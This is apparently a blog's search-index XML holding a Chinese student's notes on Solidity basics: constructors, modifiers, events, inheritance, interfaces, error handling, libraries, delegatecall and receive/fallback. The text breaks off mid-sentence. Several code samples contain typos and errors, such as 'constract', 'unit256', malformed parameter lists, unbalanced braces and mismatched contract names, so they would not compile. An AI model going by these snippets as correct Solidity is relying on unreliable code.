<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>solidity基础（2）</title>
      <link href="/2024/11/11/solidity%E5%9F%BA%E7%A1%80%EF%BC%882%EF%BC%89/"/>
      <url>/2024/11/11/solidity%E5%9F%BA%E7%A1%80%EF%BC%882%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>关键词：</p><h3 id="构造函数constructor和修饰器Modifier"><a href="#构造函数constructor和修饰器Modifier" class="headerlink" title="构造函数constructor和修饰器Modifier"></a>构造函数constructor和修饰器Modifier</h3><h4 id="constructor-NaN"><a href="#constructor-NaN" class="headerlink" title="constructor"></a>constructor</h4><p>  定义：<strong>是一种特殊函数 每个合约可以定义一个，并且在部署合约时自动运行一次。</strong></p><p>可用于初始化合约参数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract MyToken &#123;</span><br><span class="line">    string public name;</span><br><span class="line">    string public symbol;</span><br><span class="line">    uint256 public totalSupply;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    //带参数的构造函数用于初始化状态变量</span><br><span class="line">    constructor(string memory _name, string memory _symbol, uint256 _initialSupply) &#123;</span><br><span class="line">        name = _name;            // Token name</span><br><span class="line">        symbol = _symbol;        // Token symbol</span><br><span class="line">        totalSupply = _initialSupply;  // 设置初始代币供应量</span><br><span class="line">        owner = msg.sender;      // 将部署者设置为合约的拥有者owner</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="Modifier"><a href="#Modifier" class="headerlink" title="Modifier"></a>Modifier</h4><p>定义：<strong>类似于decorator，声明函数拥有的特性，并减少代码冗余</strong></p><p>主要使用场景： <strong>运行函数前的检查，例如地址，变量，余额等。</strong></p><p>定义一个叫做onlyOwner的modifier：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//定义modifier</span><br><span class="line">modifier onlyOwner&#123;</span><br><span class="line">  require(msg.sender == owner);//检查调用者是否为owner地址</span><br><span class="line">  _;// 如果是的话，继续运行函数主体；否则报错并revert交易</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>带有onlyOwner修饰符的函数只能被owner地址调用</strong></p><p>eg:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//改变owner</span><br><span class="line">function changeOwner(address_newOwner) external onlyOwner&#123;</span><br><span class="line">  owner = _newOwner;// 只能owner地址运行这个函数，并改变owner</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​在以上函数中，由于onlyOwner修饰符的存在，只有原先的owner可以调用，别人调用就会报错。这也是最常用的控制智能合约权限的方法。</p><h3 id="事件event"><a href="#事件event" class="headerlink" title="事件event"></a>事件event</h3><ol><li><h4 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h4></li></ol><ul><li>响应： 应用程序（ether.js)可以通过RPC接口订阅和监听这些事件，并在前端做响应。</li><li>经济：事件是<strong>EVM</strong>上比较经济的存储数据的方式，每个大概消耗2,000 <strong>gas</strong>；相比之下，链上存储一个新变量至少需要20,000 <strong>gas</strong>。</li></ul><ol start="2"><li><h4 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h4><ul><li><strong>日志记录</strong>：事件在链上作为日志记录保存，不能被智能合约读取，但可供外部观察。</li><li><strong>通知机制</strong>：前端应用、DApp 等可以监听事件来响应合约的变化，如更新用户余额、确认交易等。</li><li><strong>优化 Gas 消耗</strong>：事件的存储成本低于状态变量的修改，因此在某些应用场景下，使用事件记录是更高效的选择。</li></ul></li><li><h4 id="声明事件"><a href="#声明事件" class="headerlink" title="声明事件"></a>声明事件</h4></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Event + 事件名称 + (变量类型 变量名,变量类型 变量名,...)</span><br></pre></td></tr></table></figure><p>​以REC20代币合约的Transfer事件为例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">event Transfer(address indexed from,address indexed to,uint256 value);</span><br><span class="line">//from:转账地址</span><br><span class="line">//to:接收地址</span><br><span class="line">//value:转账数量</span><br><span class="line">//其中from&amp;to前面带有indexed关键字，他们会保存在以太坊虚拟机日志的topics中，方便之后检索</span><br></pre></td></tr></table></figure><ol start="4"><li><h4 id="释放事件"><a href="#释放事件" class="headerlink" title="释放事件"></a>释放事件</h4></li></ol><p>释放事件（Emit Event）是指在区块链上发布特定事件通知的操作。</p><p>通过释放事件，合约可以在发生某些操作（如状态改变、资金转移等）时，向链上日志系统发送记录。</p><p>事件通常用于通知外部应用程序，如前端应用或监听工具，便于监控合约状态的变化</p><p><strong>关键字</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Emit</span><br></pre></td></tr></table></figure><p>eg:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">//定义_transfer函数，执行转账逻辑</span><br><span class="line">function_tranfer(</span><br><span class="line">address from,</span><br><span class="line">address to;</span><br><span class="line">uint256 amount</span><br><span class="line">)external&#123;</span><br><span class="line"></span><br><span class="line">    _balance[from] = 10000000;//给转账地址一些初始代币</span><br><span class="line">    _balances[from] -=  amount; // from地址减去转账数量</span><br><span class="line">    _balances[to] += amount; // to地址加上转账数量</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    //释放事件</span><br><span class="line">    emit Transfer(from,to,amount);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="5"><li><h4 id="EVM日志"><a href="#EVM日志" class="headerlink" title="EVM日志"></a>EVM日志</h4></li></ol><p>​     <strong>EVM用日志log来存储solidity事件，每条日志记录包括主题topics和数据data两部分</strong></p><p>​5.1 <strong>主题topics</strong>（？)</p><p>​<span style = "color: red;"><strong>用于描述事件，长度不能超过4。它的第一个元素是事件的签名（哈希）</strong></span></p><p>​     eg: 例如对于上面的transfer事件，它的事件哈希：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">keccak256(&quot;Transfer(address,address,unit256)&quot;)</span><br><span class="line"></span><br><span class="line">//0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef</span><br></pre></td></tr></table></figure><p>​<strong>除了事件哈希，主题还可以包含<span style = "color: red;">至多3个indexed参数</span>，也就是Transfer事件中的from和to。</strong></p><p>​    5.2 <strong>数据data</strong></p><p>​<strong>事件中不带 indexed的参数会被存储在 data 部分中</strong>，可以理解为事件的“值”。data 部分的变量不能被直接检索，但可以存储任意大小的数据。因此一般 data 部分可以用来存储复杂的数据结构，例如数组和字符串等等，因为这些数据超过了256比特，即使存储在事件的 topics 部分中，也是以哈希的方式存储。另外，data 部分的变量在存储上消耗的gas相比于 topics 更少。</p><p>​5.3 <strong>在Etherscan上查询事件</strong></p><p>当尝试用**_transfer()<strong>函数在</strong>Sepolia<strong>测试网络上转账100代币，可以在</strong>Etherscan<strong>上查询到相应的</strong>tx**：<a href="https://sepolia.etherscan.io/tx/0xb07dcd9943662e2e8b17c7add370f046401962ce24d0690a61bb249a385dc8c9#eventlog">网址</a>。</p><p>​点击<strong>Logs</strong>按钮，就能看到事件明细</p><p>​Topics里面有三个元素，[0]是这个事件的哈希，[1]和[2]是我们定义的两个indexed变量的信息，即转账的转出地址和接收地址。Data里面是剩下的不带indexed的变量，也就是转账数量。</p><h3 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h3><ol><li><h4 id="规则"><a href="#规则" class="headerlink" title="规则"></a>规则</h4></li></ol><p>1.1  <strong>virtual</strong></p><p>​父合约中的函数，如果希望子合约重写，需要加上<strong>virtual</strong>关键字。</p><p>1.2 <strong>override</strong>：</p><p>​子合约重写了父合约中的函数，需要加上<strong>override</strong>关键字。</p><p><strong>注意</strong>：用<strong>override</strong>修饰<strong>public</strong>变量，会重写与变量同名的<strong>getter</strong>函数</p><ol start="2"><li><h4 id="简单继承"><a href="#简单继承" class="headerlink" title="简单继承"></a>简单继承</h4></li></ol><p>​先写一个简单的A合约</p><p>​再定义一个B合约，让他继承A合约</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">contract B is A</span><br></pre></td></tr></table></figure><ol start="3"><li><h4 id="多重继承"><a href="#多重继承" class="headerlink" title="多重继承"></a>多重继承</h4></li></ol><p>​规则：</p><ol><li><p><strong>继承时要按辈分最高到最低的顺序排</strong>。</p><p>eg:比如我们写一个Erzi合约，继承Yeye合约和Baba合约，那么就要写成</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">contract Erzi is Yeye, Baba</span><br></pre></td></tr></table></figure><p>而不能写成contract Erzi is Baba, Yeye，不然就会报错。</p></li><li><p><strong>如果某一个函数在多个继承的合约里都存在，在子合约里必须重写，不然会报错</strong></p></li><li><p><strong>重写在多个父合约中都重名的函数时，override关键字后面要加上所有父合约名字</strong></p></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">override(Yeye, Baba)</span><br></pre></td></tr></table></figure><h4 id="4-修饰器的继承"><a href="#4-修饰器的继承" class="headerlink" title="4. 修饰器的继承"></a>4. <strong>修饰器的继承</strong></h4><p>​用法与函数继承类似，在相应的地方加virtual和override关键字即可。</p><h4 id="5-构造函数的继承"><a href="#5-构造函数的继承" class="headerlink" title="5. 构造函数的继承"></a>5. 构造函数的继承</h4><p>​子合约有两种方法继承父合约的构造函数:</p><pre><code>1. **在继承时声明父构造函数的参数**</code></pre><p>eg:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">contract B is A(1)</span><br></pre></td></tr></table></figure><ol start="2"><li><strong>在子合约的构造函数中声明构造函数的参数</strong></li></ol><p>eg:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">contract C is A &#123;</span><br><span class="line">    constructor(uint _c) A(_c * _c) &#123; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="6"><li><h4 id="调用父合约的继承"><a href="#调用父合约的继承" class="headerlink" title="调用父合约的继承"></a>调用父合约的继承</h4></li></ol><p>​子合约有两种方式调用父合约的函数：</p><ol><li><strong>直接调用</strong></li></ol><p>​子合约直接用<strong>父合约名.函数名（）</strong>的方式来调用父合约函数</p><p>eg: Yeye.pop()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function callParent() public&#123;</span><br><span class="line">Yeye.pop();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li><strong>Super关键字</strong></li></ol><p>​子合约可以利用**super.函数名()**来调用最近的父合约函数。</p><p>eg:</p><p>​当Solidity继承关系按声明时从右到左的顺序是：contract Erzi is Yeye, Baba，那么Baba是最近的父合约，super.pop()将调用Baba.pop()而不是Yeye.pop()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function callParentSuper() public&#123;</span><br><span class="line">super.pop();</span><br><span class="line">//此处调用的是Baba.pop()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="7"><li><h4 id="钻石继承"><a href="#钻石继承" class="headerlink" title="钻石继承"></a><strong>钻石继承</strong></h4></li></ol><p>​指一个派生类同时有两个或两个以上的基类。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">yeye</span><br><span class="line">/  \</span><br><span class="line">babamama</span><br><span class="line">\  /</span><br><span class="line"> me</span><br><span class="line">*/</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">contract Yeye&#123;</span><br><span class="line"></span><br><span class="line">event Log(string message);</span><br><span class="line"></span><br><span class="line">function foo() public virtual&#123;</span><br><span class="line">emit Log(&quot;Yeye.foo called&quot;);</span><br><span class="line">&#125;</span><br><span class="line">function bar() public virtual&#123;</span><br><span class="line">emit Log(&quot;Yeye.foo called&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//baba继承yeye</span><br><span class="line">contract Baba is Yeye&#123;</span><br><span class="line">function foo() public virtual override&#123;</span><br><span class="line">emit Log(&quot;Baba.foo called&quot;);</span><br><span class="line">super.foo();</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">function bar() public virtual override&#123;</span><br><span class="line">emit Log(&quot;Eve.bar called&quot;);</span><br><span class="line">super.bar();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//mama继承yeye</span><br><span class="line">contract Mama is Yeye&#123;</span><br><span class="line">function foo() public virtual override&#123;</span><br><span class="line">emit Log(&quot;Baba.foo called&quot;);</span><br><span class="line">super.foo();</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">function bar() public virtual override&#123;</span><br><span class="line">emit Log(&quot;Mama.bar called&quot;);</span><br><span class="line">super.bar();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//me继承mama baba</span><br><span class="line">contract me is Baba,mama&#123;</span><br><span class="line">function foo() public override(Baba,Mama)&#123;</span><br><span class="line">super.foo();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function bar() public override(Baba,Mama)&#123;</span><br><span class="line">super.bar();</span><br><span class="line">//此处Super.bar会依次调用baba,mama最后是god合约</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>(当然现实辈分关系具体不是这样，只是代指三个层次)</p><p>所谓钻石，即<strong>虽然Baba,Mama都是Yeye的子合约，但整个过程中，God合约只会被调用一次</strong></p><p>(因为solidity强制一个由基类构成的DAG（有向无环图）使其保证一个特定的顺序)</p><h3 id="抽象合约"><a href="#抽象合约" class="headerlink" title="抽象合约"></a><strong>抽象合约</strong></h3><p>​如果一个智能合约里至少有一个未实现的函数，即某个函数缺少主体**{}<strong>中的内容，则必须将该合约标为</strong>abstract**，不然编译会报错。</p><p>未实现的函数需要加<strong>virtual</strong>，以便子合约重写。拿插入排序合约为例，如果我们还没想好具体怎么实现插入排序函数，那么可以把合约标为<strong>abstract</strong>，之后让别人补写上。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">constract Sort&#123;</span><br><span class="line"></span><br><span class="line">abstract constract Insertsort&#123;</span><br><span class="line">function insertionSort(uint[] memory a)public pure virtual returns(uint[] memory)&#123;</span><br><span class="line">/*for(uint i = 0; i &lt; a.length;i++)&#123;</span><br><span class="line">uint temp = a[i];</span><br><span class="line">uint j = i;</span><br><span class="line">while(j &gt; 0 &amp;&amp; temp &lt;a[j - 1])&#123;</span><br><span class="line">a[j] = a[j - 1];</span><br><span class="line">j--;</span><br><span class="line">&#125;</span><br><span class="line">a[j] = temp;</span><br><span class="line">&#125;</span><br><span class="line">return 0;</span><br><span class="line">*/</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/*Solidity中最常用的变量类型是uint，也就是正整数，取到负值的话，会报underflow错误。而在插入算法中，变量j有可能会取到-1，引起报错。这里，我们需要把j加1，让它无法取到负值。*/</span><br></pre></td></tr></table></figure><h3 id="接口（interface）"><a href="#接口（interface）" class="headerlink" title="接口（interface）"></a><strong>接口</strong>（interface）</h3><p><strong>规则</strong>：</p><pre><code>1. 接口不能包含状态变量1. 不能包含构造函数1. 不能继承除接口外的其他合约1. 所有函数都必须是external且不能有函数体1. 继承接口的非抽象合约必须实现接口定义的所有功能</code></pre><p>接口提供了两个重要的信息：</p><ol><li>合约里每个函数的<strong>bytes4</strong>选择器，以及函数签名<strong>函数名(每个参数类型）</strong>。</li><li>接口id（更多信息见<a href="https://eips.ethereum.org/EIPS/eip-165">EIP165</a>）</li></ol><p>另外，接口与合约<strong>ABI</strong>（Application Binary Interface）等价，可以相互转换：编译接口可以得到合约的<strong>ABI</strong>，利用<a href="https://gnidan.github.io/abi-to-sol/">abi-to-sol工具</a>，也可以将<strong>ABI json</strong>文件转换为<strong>接口sol</strong>文件。</p><p><strong>接口和常规合约的区别在于每个函数都以;代替函数体{ }结尾。</strong></p><p>什么时候使用接口：</p><p>我们不需要知道它的源代码，只需知道它的合约地址，用对应的接口就可以与它交互。都可以写模版并且减少代码冗余。</p><h3 id="三种抛出异常"><a href="#三种抛出异常" class="headerlink" title="三种抛出异常"></a><strong>三种抛出异常</strong></h3><h4 id="1-error"><a href="#1-error" class="headerlink" title="1. error"></a><strong>1. error</strong></h4><p>​可以在contract之外定义异常。</p><p>Eg : 我们定义一个<strong>TransferNotOwner</strong>异常，当用户不是代币<strong>owner</strong>的时候尝试转账，会抛出错误：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error TransferNotOwner(); *//* *自定义error*</span><br></pre></td></tr></table></figure><p>我们也可以定义一个<strong>携带参数的异常</strong>，来提示尝试转账的账户地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error TransferNotOwner(address sender); // 自定义的带参数的error</span><br></pre></td></tr></table></figure><p><strong>在执行当中，error必须搭配revert（回退）命令使用</strong></p><h4 id="2-Require"><a href="#2-Require" class="headerlink" title="2. Require"></a>2. Require</h4><p>​它很好用，唯一的缺点就是gas随着描述异常的字符串长度增加，比error命令要高</p><p>使用方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">require(检查条件，“异常的描述”)</span><br></pre></td></tr></table></figure><p>​当检查条件不成立的时候，就会抛出异常</p><h4 id="3-Assert"><a href="#3-Assert" class="headerlink" title="3. Assert"></a>3. Assert</h4><p>比require少个字符串，即不能抛出异常的原因</p><p>assert命令一般用于程序员写程序debug，它的用法很简单</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert(检查条件）</span><br></pre></td></tr></table></figure><p>当检查条件不成立的时候，就会抛出异常。</p><h4 id="三种方法的gas比较"><a href="#三种方法的gas比较" class="headerlink" title="三种方法的gas比较"></a>三种方法的gas比较</h4><p><span style = "color: blue;">error方法gas最少，其次是assert，require方法消耗gas最多</span></p><p>因此，error既可以告知用户抛出异常的原因，又能省gas要多用！</p><h3 id="函数重载"><a href="#函数重载" class="headerlink" title="函数重载"></a>函数重载</h3><p>实参匹配：调用重载函数时，会把输入的实际参数和函数参数的变量类型做匹配。</p><p> 如果出现多个匹配的重载函数，则会报错</p><p><strong>overloading</strong>:即名字相同但输入参数类型不同的函数可以同时存在，他们被视为不同的函数。</p><p><strong>solidity不允许修饰器（modifier）重载</strong></p><h3 id="库合约"><a href="#库合约" class="headerlink" title="库合约"></a>库合约</h3><p>​库合约是一系列的函数合集，用于提升solidity代码的复用性和减少gas而存在</p><p>​他和普通合约主要有以下几点不同：</p><ol><li>不能存在状态变量</li><li>不能够继承或被继承</li><li>不能接收以太币</li><li>不可以被销毁</li></ol><p>​库合约中的函数可见性如果被设置为public或者external，则在调用函数时会触发一次delegatecall。而如果被设置为internal，则不会引起。对于设置为private可见性的函数来说，其仅能在库合约中可见，在其他合约中不可用。</p><p><strong>delegatecall</strong>: </p><p><code>delegatecall</code> 是一种特殊的低级函数调用，用于将当前合约的上下文（包括<code>msg.sender</code>和<code>msg.value</code>等）传递给另一个合约的函数执行。<code>delegatecall</code> 允许合约在不改变调用者上下文的情况下执行另一个合约的代码。</p><p><strong><code>delegatecall</code> 的作用</strong></p><ul><li><strong>共享存储</strong>：<code>delegatecall</code> 是调用另一个合约的代码，并在调用者合约的存储上下文中执行。这意味着被调用合约的代码会对调用合约的存储变量进行读写。</li><li><strong>保持调用者上下文</strong>：<code>msg.sender</code> 和 <code>msg.value</code> 等上下文信息保持不变，依旧指向调用者，这和普通的合约调用不同。</li><li><strong>代码重用</strong>：使用 <code>delegatecall</code> 可以使多个合约共享同一段逻辑代码，通过代理模式实现合约的代码复用。</li></ul><h4 id="Strings库合约"><a href="#Strings库合约" class="headerlink" title="Strings库合约"></a><strong>Strings库合约</strong></h4><p>Strings库合约是将uint256类型转换为相应的string类型的代码库</p><p><strong>如何利用</strong>：</p><p>​用using for 指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">using A for B</span><br></pre></td></tr></table></figure><p>​用于附加库合约（从库A）到任何类型（B)。添加完指令后，库A中的函数会自动添加为B类型变量的成员，可以直接调用。</p><p>注意： 在调用的时候，这个变量会被当作第一个参数传递给函数</p><p><strong>直接通过库合约名称调用函数</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//利用using for指令</span><br><span class="line"></span><br><span class="line">using String for uint256;</span><br><span class="line">function getString1(uint256_number)public pure returns(string memory)&#123;</span><br><span class="line"></span><br><span class="line">//库合约中的函数会自动添加为uint256型变量的成员</span><br><span class="line"></span><br><span class="line">return _number.toHexString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>常用库合约</strong>：</p><p><a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/4a9cc8b4918ef3736229a5cc5a310bdc17bf759f/contracts/utils/Strings.sol">Strings</a>：将<code>**uint256**</code>转换为<code>**String**</code></p><p><a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/4a9cc8b4918ef3736229a5cc5a310bdc17bf759f/contracts/utils/Address.sol">Address</a>：判断某个地址是否为合约地址</p><p><a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/4a9cc8b4918ef3736229a5cc5a310bdc17bf759f/contracts/utils/Create2.sol">Create2</a>：更安全的使用<code>**Create2 EVM opcode**</code></p><p><a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/4a9cc8b4918ef3736229a5cc5a310bdc17bf759f/contracts/utils/Arrays.sol">Arrays</a>：跟数组相关的库合约</p><h3 id="引用Import"><a href="#引用Import" class="headerlink" title="引用Import"></a>引用Import</h3><p>​引用（import）在代码中的<strong>位置为： 在声明版本号之后，在其余代码之前</strong></p><p>​import语句可以帮助我们在一个文件中引用另一个文件的内容</p><h4 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h4><ol><li>通过源文件相对位置导入</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//通过文件相对位置import</span><br><span class="line">import &#x27;./name.sol&#x27;</span><br></pre></td></tr></table></figure><ol start="2"><li>通过源文件网址导入网上的合约的全局符号</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//通过网址引用</span><br><span class="line">import&#x27;url&#x27;</span><br></pre></td></tr></table></figure><ol start="3"><li><p>通过npm的目录导入</p></li><li><p>通过指定全局符号导入合约特定的全局符号</p></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import &#123;name&#125; from&#x27;./name.sol&#x27;</span><br></pre></td></tr></table></figure><p>​其中的 <code>name</code> 就是一个 <em>全局符号</em>。它可以是一个具体的合约、库、结构体、枚举或函数的名称。通过 <code>import</code> 语句，可以从指定的文件（例如 <code>name.sol</code>）中导入该符号，以便在当前文件中直接使用。</p><h3 id="回调函数receive-fallback"><a href="#回调函数receive-fallback" class="headerlink" title="回调函数receive&amp;fallback"></a>回调函数receive&amp;fallback</h3><h4 id="作用-1"><a href="#作用-1" class="headerlink" title="作用"></a>作用</h4><pre><code>1. 接受ETH1. 处理合约中不存在的函数调用（代理合约proxy contract）</code></pre><p>（所以：fallback 和 receive 函数<strong>无法在合约内部直接调用</strong>。这些特殊函数只能通过外部调用触发，通常在接收以太币或处理未知的函数调用时<strong>自动执行</strong></p><h4 id="接收ETH函数receive"><a href="#接收ETH函数receive" class="headerlink" title="接收ETH函数receive"></a>接收ETH函数receive</h4><p>a. 在合约收到ETH转账时被调用</p><p>b. 一个合约最多有一个receive()函数</p><p>c. 声明方式: </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">receive() external payable &#123; ... &#125; [不需要function关键字]</span><br></pre></td></tr></table></figure><p>d.  receive()函数不能有任何的参数，不能返回任何值，必须包含external和payable</p><p>receive()最好不要执行太多的逻辑，receive()太复杂可能会触发Out of Gas报错</p><h4 id="回退函数fallback"><a href="#回退函数fallback" class="headerlink" title="回退函数fallback"></a>回退函数fallback</h4><p>a.   在调用合约不存在的函数时被触发</p><p>b.   可用于接收ETH，也可以用于代理合约proxy contract</p><p>c.   声明时不需要function关键字，必须由external修饰，一般也会用payable修饰</p><p>Eg: 用于接收ETH:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fallback() external payable &#123; ... &#125;</span><br></pre></td></tr></table></figure><h4 id="二者区别"><a href="#二者区别" class="headerlink" title="二者区别"></a>二者区别</h4><ol><li><p>合约接收ETH时，msg.data为空且存在Receive()时，会触发receive()；msg.data不为空或不存在receive()时，会触发fallback()，此时fallback()必须为payable</p></li><li><p>receive()和payable fallback()均不存在的时候，向合约直接发送ETH将会报错</p><p>（你仍可以通过带有payable的函数向合约发送ETH）</p></li></ol><p><img src="https://s2.loli.net/2024/11/18/9GL52VTyYbe8xsH.png" alt="1.png"></p><p>​在这个场景中，vitalik 向合约 ReceiveETH 发起了一笔带有 msg.data（0xaa）的低级交互，同时设置了 value 为 100 Wei。让我们分析代码：</p><ul><li>合约 ReceiveETH 中定义了一个 receive() 函数，该函数是 external 和 payable 的，但 receive() 